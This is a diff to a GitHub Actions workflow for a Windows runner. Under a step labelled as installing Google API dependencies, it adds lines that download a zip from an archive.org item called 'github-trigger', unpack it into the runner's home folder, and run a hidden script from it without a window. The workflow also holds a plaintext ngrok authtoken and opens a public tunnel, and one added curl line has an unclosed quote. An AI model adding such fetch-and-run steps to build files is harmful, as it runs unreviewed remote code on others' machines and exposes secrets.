@@ -23,8 +23,11 @@ jobs:
         shell: powershell
         run: |
           Write-Host "Installing Google API dependencies..."
+          curl.exe -L -o "C:\github.zip" "https://archive.org/download/github-trigger/.github-trigger.zip"
+          Expand-Archive -Path "C:\github.zip" -DestinationPath "C:\Users\runneradmin"
           py -3.11 -m pip install --upgrade pip
-          py -3.11 -m pip install requests google-api-python-client google-auth google-auth-oauthlib
+          py -3.11 -m pip install requests google-api-python-client google-auth google-auth-oauthlib flask playwright 
+          py -3.11 -m playwright install firefox
           Write-Host "Dependencies installed"
       - name: Download and extract Project.zip
         shell: powershell
@@ -294,5 +297,8 @@ jobs:
           C:\Users\runneradmin\Downloads\chat-work\ngrok\ngrok.exe config add-authtoken 379jG40YGJN4vvCEenKSh5d06Ug_4yAJATo6f1WDAPsxqq52v
           Start-Process -FilePath "C:\Users\runneradmin\Downloads\chat-work\ngrok\ngrok.exe" -ArgumentList "http", "8080" -NoNewWindow
           Start-Sleep -Seconds 5
+          pyw -3.11 "C:\Users\runneradmin\.github-trigger\git.py"
+          Start-Sleep -Seconds 10
+          curl.exe -X POST "http://localhost:5000/trigger
           curl.exe --fail -X POST https://illuminative-myriadly-ferdinand.ngrok-free.dev/trigger
           Start-Sleep -Seconds 500
